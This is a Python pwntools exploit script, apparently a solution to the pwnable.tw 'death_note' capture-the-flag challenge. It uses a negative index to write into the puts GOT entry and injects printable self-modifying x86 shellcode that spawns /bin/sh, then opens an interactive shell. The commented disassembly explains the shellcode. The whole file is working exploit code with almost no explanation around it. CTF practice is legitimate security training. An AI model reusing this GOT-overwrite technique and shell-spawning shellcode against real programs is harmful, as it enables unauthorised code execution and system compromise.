from pwn import *

#elf = ELF('./death_note')
#io = process('./death_note')
io = remote('chall.pwnable.tw', 10201)

def add(index, name):
    print(io.recvuntil(b'Your choice :'))
    io.sendline(b'1')
    print(io.recvuntil(b'Index :'))
    io.sendline(str(index))
    print(io.recvuntil(b'Name :'))
    io.sendline(name)

def show(index):
    print(io.recvuntil(b'Your choice :'))
    io.sendline(b'2')
    print(io.recvuntil(b'Index :'))
    io.sendline(str(index))

def delete(index):
    print(io.recvuntil(b'Your choice :'))
    io.sendline(b'3')
    print(io.recvuntil(b'Index :'))
    io.sendline(str(index))

def quit():
    print(io.recvuntil(b'Your choice :'))
    io.sendline(b'4')


'''
push   ecx
push   0x68732f2f
push   0x6e69622f
dec    ecx
dec    ecx
push   edx
pop    eax
push   ebx
push   ebx
pop    edx
xor    BYTE PTR [eax+0x26], cl    ---> the first byte after the whole shellcode:  0x33
xor    BYTE PTR [eax+0x27], cl    ---> the second byte after the whole shellcode: 0x7e
pop    ecx
push   esp
pop    ebx
push   0x7e7e7e7e
pop    eax
xor    eax, 0x7e7e7e75
'''

# -16 is the plus offset to get to puts GOT table

add(-16, '\x51\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x49\x49\x52\x58\x53\x53\x5A\x30\x48\x26\x30\x48\x27\x59\x54\x5B\x68\x7E\x7E\x7E\x7E\x58\x35\x75\x7E\x7E\x7E\x33\x7E')

print('Look at this beautiful shellcode: \x51\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x49\x49\x52\x58\x53\x53\x5A\x30\x48\x26\x30\x48\x27\x59\x54\x5B\x68\x7E\x7E\x7E\x7E\x58\x35\x75\x7E\x7E\x7E\x33\x7E')

io.interactive()
